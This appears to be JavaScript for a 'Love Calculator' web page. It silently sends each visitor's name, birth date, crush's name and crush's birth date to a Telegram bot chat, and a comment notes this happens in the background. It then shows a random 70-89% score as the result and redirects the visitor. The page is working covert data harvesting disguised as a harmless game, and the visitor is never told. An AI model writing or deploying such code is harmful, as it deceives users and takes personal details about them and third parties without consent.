// ⚠️ BOT TOKEN public GitHub pe mat rakho
const BOT_TOKEN = "PASTE_NEW_TOKEN_HERE";
const CHAT_ID = "8413629225";

function sendToTelegram(yourName, yourDOB, crushName, crushDOB) {
  const message = `
📩 New Submission Received

👤 Name: ${yourName}
🎂 DOB: ${yourDOB}

❤️ Crush Name: ${crushName}
🎂 Crush DOB: ${crushDOB}

🌐 Source: Love Calculator
`;

  try {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    });
  } catch (error) {
    console.log("Message could not be sent");
  }
}

function calculateLove() {
  const yourName = document.getElementById("yourName").value.trim();
  const yourDOB = document.getElementById("yourDOB").value;
  const crushName = document.getElementById("crushName").value.trim();
  const crushDOB = document.getElementById("crushDOB").value;

  if (!yourName || !crushName || !yourDOB || !crushDOB) {
    alert("Please enter all details ❤️");
    return;
  }

  // Data Telegram ko bhejo (background me)
  sendToTelegram(yourName, yourDOB, crushName, crushDOB);

  const lovePercent = Math.floor(Math.random() * 20) + 70;

  localStorage.setItem("yourName", yourName);
  localStorage.setItem("crushName", crushName);
  localStorage.setItem("lovePercent", lovePercent);

  // Redirect forcefully
  setTimeout(() => {
    window.location.href = "love.html";
  }, 300);
}
